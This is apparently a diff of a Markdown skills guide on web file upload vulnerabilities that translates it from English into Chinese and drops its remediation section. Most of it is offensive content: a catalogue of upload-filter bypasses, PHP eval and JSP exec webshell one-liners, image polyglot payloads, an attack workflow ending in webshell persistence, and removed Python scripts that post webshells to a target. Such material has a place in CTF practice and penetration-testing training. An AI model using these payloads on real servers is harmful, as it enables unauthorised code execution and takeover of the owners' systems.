@@ -1,10 +1,8 @@
-# File Upload Vulnerability - Skills Guide
+# 文件上传漏洞 (File Upload)
 
-## Overview
+当开发者未严格验证和过滤上传文件时，允许攻击者上传可执行的动态脚本（webshell）。
 
-File upload vulnerability occurs when developers fail to strictly validate and filter uploaded files, allowing attackers to upload executable dynamic script files (webshells).
-
-**Impact**: Attackers can control the entire website or even the server through uploaded malicious files (webshells).
+**影响**：攻击者可以通过上传恶意文件（webshell）控制整个网站甚至服务器。
 
 ## 决策策略
 
@@ -26,287 +24,228 @@ File upload vulnerability occurs when developers fail to strictly validate and f
 - 尝试绕过扩展名（.php5, .phtml, .phar）
 - 尝试上传到不同目录
 
----
+## 上传流程
 
-## File Upload Process
+1. **客户端**：用户选择文件
+2. **上传请求**：表单将文件和字段打包成 HTTP 请求
+3. **服务端解析**：提取文件内容和字段（PHP 存储在 `$_FILES`）
+4. **验证**：服务端验证文件安全性
+5. **存储**：将文件从临时目录移动到目标位置
+6. **响应**：服务端返回上传结果
 
-1. **Client**: User selects file via file picker
-2. **Upload Request**: Form packages file data and fields into HTTP request
-3. **Server Parse**: Extracts file content and fields (PHP stores in `$_FILES`)
-4. **Validation**: Server validates file security
-5. **Storage**: Moves file from temp directory to target location
-6. **Response**: Server responds with upload result
+## PHP $_FILES 数组
 
----
+| 键 | 描述 |
+|-----|------|
+| `name` | 客户端原始文件名 |
+| `type` | MIME 类型（来自 Content-Type 头，**不可靠**） |
+| `size` | 文件大小（字节） |
+| `tmp_name` | 服务端临时文件路径 |
+| `error` | 错误码（0 = 成功） |
 
-## PHP $_FILES Array
+## 漏洞分类
 
-| Key | Description |
-|-----|-------------|
-| `name` | Original filename from client |
-| `type` | MIME type (from Content-Type header, **unreliable**) |
-| `size` | File size in bytes |
-| `tmp_name` | Temp file path on server |
-| `error` | Error code (0 = success) |
+### 1. 直接上传（无限制）
+- 完全没有任何验证
+- 攻击者直接上传 webshell
 
-### Error Codes
+### 2. 条件上传（可绕过）
 
-| Value | Constant | Meaning |
-|-------|----------|---------|
-| 0 | UPLOAD_ERR_OK | No error |
-| 1 | UPLOAD_ERR_INI_SIZE | Exceeds php.ini limit |
-| 2 | UPLOAD_ERR_FORM_SIZE | Exceeds form MAX_FILE_SIZE |
-| 3 | UPLOAD_ERR_PARTIAL | Partial upload |
-| 4 | UPLOAD_ERR_NO_FILE | No file uploaded |
+| 类型 | 描述 |
+|------|------|
+| 前端仅验证 | JS 验证，可用直接 HTTP 请求绕过 |
+| Header 检查 | 文件头/Magic Number 检测可绕过 |
+| 过滤不完整 | 弱的扩展名/MIME 过滤 |
+| 缺少认证 | 匿名上传访问 |
+| 中间件配置错误 | 服务器解析意外扩展名 |
 
----
+## 常见可执行扩展名
 
-## Vulnerability Classification
-
-### 1. Direct Upload (No Restriction)
-- No validation at all
-- Attacker uploads webshell directly
-
-### 2. Conditional Upload (Bypassable)
-
-| Type | Description |
-|------|-------------|
-| Frontend Only | JS validation, bypass with direct HTTP request |
-| Header Check | File header/Magic Number detection bypass |
-| Incomplete Filter | Weak extension/MIME filtering |
-| Auth Missing | Anonymous upload access |
-| Middleware Misconfig | Server parses unexpected extensions |
-
----
-
-## Common Executable Extensions
-
-### PHP Series
+### PHP 系列
 ```
 .php, .php3, .php4, .php5, .phtml, .pht
 ```
 
-### ASP Series
+### ASP 系列
 ```
 .asp, .asa, .aspx, .ashx, .cer, .cdx
 ```
 
-### JSP Series
+### JSP 系列
 ```
 .jsp, .jspx, .jspa, .jsw, .jsv, .jspf
 ```
 
-### Other
-```
-.shtml, .htaccess
-```
+## 绕过技术
 
----
+### 1. 前端 JS 绕过
+- **方法**：删除前端验证代码
+- **方法**：重命名为允许的扩展名，用 Burp 拦截后改回
 
-## Bypass Techniques
+### 2. Content-Type 绕过
+- 服务端检查 `$_FILES['file']['type']`（客户端提供，不可靠）
+- **方法**：将 `Content-Type: application/octet-stream` 改为 `Content-Type: image/jpeg`
 
-### 1. Frontend JS Bypass
-- **Method**: Delete frontend validation code OR
-- **Method**: Rename to allowed extension, intercept with Burp, change back
+### 3. 黑名单绕过 - 替代扩展名
+- 上传 `.phtml`、`.php5`、`.php3` 而非 `.php`
+- 需要 Apache 配置：`AddType application/x-httpd-php .php .phtml .php3 .php5`
 
-### 2. Content-Type Bypass
-- Server checks `$_FILES['file']['type']` (client-provided, unreliable)
-- **Method**: Change `Content-Type: application/octet-stream` to `Content-Type: image/jpeg`
-
-### 3. Blacklist Bypass - Alternative Extensions
-- Upload `.phtml`, `.php3`, `.php5` instead of `.php`
-- Requires Apache config: `AddType application/x-httpd-php .php .phtml .php3 .php5`
-
-### 4. .htaccess Upload
-- Upload `.htaccess` to change parsing rules:
+### 4. .htaccess 上传
+- 上传 `.htaccess` 改变解析规则：
 ```apache
 AddType application/x-httpd-php .jpg
 ```
-```apache
-<FilesMatch "jpg">
-SetHandler application/x-httpd-php
-</FilesMatch>
-```
-- Then upload webshell with `.jpg` extension
+- 然后上传 `.jpg` 扩展名的 webshell
 
-### 5. Case Bypass
-- Server doesn't normalize case
-- **Method**: Upload `.PHP`, `.PhP`, `.pHp`
+### 5. 大小写绕过
+- 服务端不规范化大小写
+- **方法**：上传 `.PHP`、`.PhP`、`.pHp`
 
-### 6. Space Bypass
-- Server doesn't trim spaces in extension
-- **Method**: Upload `shell.php ` (trailing space)
-- Windows ignores trailing spaces in filename
+### 6. 空格绕过
+- 服务端不 trim 扩展名中的空格
+- **方法**：上传 `shell.php `（尾部空格）
+- Windows 自动忽略尾部空格
 
-### 7. Dot Bypass (Windows)
-- Server doesn't remove trailing dots
-- **Method**: Upload `shell.php.`
-- Windows automatically removes trailing dot, resulting in `shell.php`
+### 7. 点绕过 (Windows)
+- 服务端不移除尾部点
+- **方法**：上传 `shell.php.`
+- Windows 自动移除尾部点，变为 `shell.php`
 
-### 8. NTFS ADS Bypass (Windows)
-- NTFS Alternate Data Streams
-- **Method**: Upload `shell.php::$DATA`
-- Windows creates `shell.php` with the content
+### 8. NTFS ADS 绕过 (Windows)
+- NTFS 备用数据流
+- **方法**：上传 `shell.php::$DATA`
+- Windows 创建 `shell.php`
 
-### 9. Double Extension Bypass
-- Server only removes one trailing dot
-- **Method**: Upload `shell.php. .` or `shell.php..`
-- Apache parses right-to-left
+### 9. 双扩展名绕过
+- 服务端只移除一个尾部点
+- **方法**：上传 `shell.php. .` 或 `shell.php..`
+- Apache 从右向左解析
 
-### 10. Double Write Bypass
-- Server replaces blacklisted extensions with empty string
-- **Method**: Upload `shell.pphphp` → becomes `shell.php`
+### 10. 双写绕过
+- 服务端将黑名单扩展名替换为空字符串
+- **方法**：上传 `shell.pphphp` → 变为 `shell.php`
 
-### 11. %00 Null Byte Truncation
-- **GET**: `save_path=/upload/shell.php%00`
-- **POST**: Need actual null byte (not `%00` string)
-- PHP < 5.3.4 vulnerable
+### 11. %00 空字节截断
+- **GET**：`save_path=/upload/shell.php%00`
+- **POST**：需要实际空字节（不是 `%00` 字符串）
+- PHP < 5.3.4 有效
 
-### 12. File Header Bypass (Magic Number)
-- Server checks first bytes of file
-- **Method**: Add valid image header to webshell:
+### 12. 文件头绕过 (Magic Number)
+- 服务端检查文件开头字节
+- **方法**：在 webshell 前添加有效图片头：
 ```
 GIF89a<?php @eval($_POST['cmd']); ?>
 ```
-- Or create image+PHP polyglot:
+- 或创建图片+PHP 混合文件：
 ```bash
 copy pic.jpg /b + shell.php /a shell.jpg
 ```
-- Requires file inclusion to execute
+- 需要文件包含才能执行
 
-### 13. Image Function Bypass
-- `getimagesize()` / `exif_imagetype()` validation
-- **Method**: Upload valid image with embedded PHP code
-- Requires file inclusion vulnerability
+### 13. 图片函数绕过
+- `getimagesize()` / `exif_imagetype()` 验证
+- **方法**：上传带 PHP 代码的有效图片
+- 需要文件包含漏洞
 
-### 14. Secondary Rendering Bypass
-- Server re-encodes uploaded images
-- **Method**: Find unchanged data regions in rendered image
-- Insert PHP code in those regions
-- GIF is best for this attack
+### 14. 二次渲染绕过
+- 服务端重新编码上传的图片
+- **方法**：在渲染后不变的图片区域插入 PHP 代码
+- GIF 最适合此攻击
 
-### 15. Race Condition
-- Server saves file before validation
-- **Method**: Continuous upload + continuous access
-- Use Burp Intruder for concurrent requests
+### 15. 竞争条件
+- 服务端在验证前保存文件
+- **方法**：持续上传 + 持续访问
+- 使用 Burp Intruder 并发请求
 
-### 16. Apache Parsing Vulnerability
-- Apache parses extensions right-to-left
-- **Method**: Upload `shell.php.abc` (unknown extension)
-- Apache falls back to `.php`
+### 16. Apache 解析漏洞
+- Apache 从右向左解析扩展名
+- **方法**：上传 `shell.php.abc`（未知扩展名）
+- Apache 回退到 `.php`
 
-### 17. Array Index Bypass
-- PHP array with non-contiguous indices
+### 17. 数组索引绕过
+- PHP 数组使用非连续索引
 ```php
 $file[0] = "shell.php";
 $file[2] = "jpg";
 // count($file) = 2, $file[1] = NULL
-// Extension check fails, saves as shell.php
+// 扩展名检查失败，保存为 shell.php
 ```
 
----
+## 图片 Magic Numbers
 
-## Image Magic Numbers
-
-| Format | Hex | ASCII |
-|--------|-----|-------|
+| 格式 | 十六进制 | ASCII |
+|------|---------|-------|
 | JPEG | `FF D8 FF` | - |
 | PNG | `89 50 4E 47 0D 0A 1A 0A` | `%PNG` |
 | GIF | `47 49 46 38 37 61` | `GIF87a` |
 | GIF | `47 49 46 38 39 61` | `GIF89a` |
 
----
-
-## Other Vulnerabilities
+## 其他解析漏洞
 
 ### Nginx 0.8.3
 ```
-1.jpg%00php → parsed as PHP
+1.jpg%00php → 被解析为 PHP
 ```
 
 ### PHP-CGI (Nginx/IIS 7+)
 ```
-1.jpg/1.php → parsed as PHP
+1.jpg/1.php → 被解析为 PHP
 ```
 
 ### Apache HTTPD (CVE-2017-15715)
 ```
-shell.php\x0A → parsed as PHP (newline char)
+shell.php\x0A → 被解析为 PHP（换行符）
 ```
 
----
+## 攻击流程
 
-## Attack Workflow
+1. **识别上传接口**
+   - 头像上传、文件编辑器、媒体上传
+   - 检查认证要求
 
-1. **Identify Upload Interface**
-   - Avatar upload, file editor, media upload
-   - Check authentication requirements
+2. **捕获 & 测试**
+   - 使用 Burp Suite 捕获请求
+   - 测试直接脚本上传
+   - 分析错误响应
 
-2. **Capture & Test**
-   - Use Burp Suite to capture requests
-   - Test direct script upload
-   - Analyze error responses
+3. **绕过验证**
+   - 系统尝试所有绕过技术
+   - 检查前端/后端验证
+   - 测试扩展名、MIME、内容检查
 
-3. **Bypass Validation**
-   - Try all bypass techniques systematically
-   - Check for frontend/backend validation
-   - Test extension, MIME, content checks
+4. **后渗透**
+   - 访问上传文件 URL
+   - 验证代码执行
+   - 检查目录权限
 
-4. **Post-Exploitation**
-   - Access uploaded file URL
-   - Verify code execution
-   - Check directory permissions
-
----
-
-## Extension Fuzzing List
+## 扩展名模糊测试列表
 
 ```
 .php .php5 .php4 .php3 .php2 .phtml .pht
 .pHp .pHp5 .pHp4 .pHp3 .pHp2 .pHtml
 .jsp .jspx .jspa .jsw .jsv .jspf .jtml
-.jSp .jSpx .jSpa .jSw .jSv .jSpf .jHtml
 .asp .aspx .asa .asax .ascx .ashx .asmx .cer
-.aSp .aSpx .aSa .aSax .aScx .aShx .aSmx .cEr
 .shtml .htaccess .swf .sWf
 ```
 
----
+## CTF 快速参考
 
-## Remediation
+| 检查类型 | 绕过方法 |
+|----------|----------|
+| 前端 JS | Burp 拦截，修改扩展名 |
+| Content-Type | 改为 `image/jpeg` |
+| 黑名单 | 替代扩展名 (.phtml) |
+| 大小写敏感 | `.PHP`, `.PhP` |
+| Trim | 尾部加空格、点 |
+| Windows | `::$DATA`, 双点 |
+| 双写 | `.pphphp` |
+| 文件头 | 添加 `GIF89a` 前缀 |
+| 图片检查 | 图片混合 + 文件包含 |
+| 竞争条件 | 并发上传 + 访问 |
+| 路径控制 | `%00` 截断 |
+| 数组 | 非连续索引 |
 
-1. **Access Control**: Require authentication for upload
-2. **Directory Permissions**: Disable script execution in upload directory
-3. **Whitelist**: Only allow specific extensions
-4. **Content Validation**: Check file magic numbers, not just extension
-5. **Rename Files**: Use random names, remove original extension
-6. **Size Limits**: Prevent DoS via large files
-7. **Logging**: Record all upload attempts
-8. **Virus Scan**: Scan uploaded files for malware
-
----
-
-## Quick Reference for CTF
-
-| Check Type | Bypass Method |
-|------------|---------------|
-| Frontend JS | Burp intercept, modify extension |
-| Content-Type | Change to `image/jpeg` |
-| Blacklist | Alternative extensions (.phtml) |
-| Case sensitive | `.PHP`, `.PhP` |
-| Trimming | Space, dot at end |
-| Windows | `::$DATA`, double dot |
-| Double write | `.pphphp` |
-| File header | Add `GIF89a` prefix |
-| Image check | Image polyglot + file inclusion |
-| Rendering | Find unchanged bytes in GIF |
-| Race condition | Concurrent upload + access |
-| Path control | `%00` truncation |
-| Array | Non-contiguous indices |
-
----
-
-## Webshell Examples
+## Webshell 示例
 
 ### PHP
 ```php
@@ -324,62 +263,8 @@ shell.php\x0A → parsed as PHP (newline char)
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
 ```
 
----
+## 上传后步骤
 
-## 来自 CTF 经验积累
-
-### Quick Detection Checklist
-1. **Direct Upload** - Try uploading `.php`, `.asp`, `.jsp` directly
-2. **Frontend Bypass** - Check if validation is JS-only (no network request)
-3. **Content-Type** - Change MIME type to `image/jpeg`
-4. **Extension Variants** - Try `.phtml`, `.php3`, `.php5`, `.PhP`
-5. **Special Characters** - Add space, dot, `::$DATA` to extension
-6. **Double Write** - `.pphphp` if extension is replaced with empty
-7. **.htaccess** - Upload config file to change parsing rules
-8. **Image Polyglot** - Add image header to webshell
-9. **Race Condition** - Continuous upload + access
-10. **Path Truncation** - `%00` null byte in save path
-
-### 攻击场景
-
-**Scenario 1: Basic Upload**
-```python
-import requests
-files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'application/octet-stream')}
-r = requests.post('http://target/upload.php', files=files)
-```
-
-**Scenario 2: Content-Type Bypass**
-```python
-files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
-```
-
-**Scenario 3: .htaccess + Image**
-```python
-# Step 1: Upload .htaccess
-htaccess = 'AddType application/x-httpd-php .jpg'
-files = {'file': ('.htaccess', htaccess, 'text/plain')}
-requests.post('http://target/upload.php', files=files)
-# Step 2: Upload PHP code as .jpg
-files = {'file': ('shell.jpg', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
-```
-
-**Scenario 4: Image Polyglot**
-```python
-payload = b'GIF89a<?php system($_GET["c"]); ?>'
-files = {'file': ('shell.gif', payload, 'image/gif')}
-# Need file inclusion to execute
-```
-
-**Scenario 5: Race Condition**
-```python
-import threading
-def upload(): requests.post('http://target/upload.php', files=files)
-def access(): r = requests.get('http://target/uploads/shell.php?c=id')
-# Run multiple threads concurrently
-```
-
-### Post-Upload Steps
-1. **Find Upload Location** - Check response, try common paths: `/uploads/`, `/files/`, `/images/`
-2. **Verify Execution** - Access directly, check if code executed or displayed
-3. **Establish Persistence** - Upload webshell for remote control
+1. **找到上传位置** - 检查响应，尝试常见路径：`/uploads/`、`/files/`、`/images/`
+2. **验证执行** - 直接访问，检查代码是执行还是显示
+3. **建立持久化** - 上传 webshell 以便远程控制
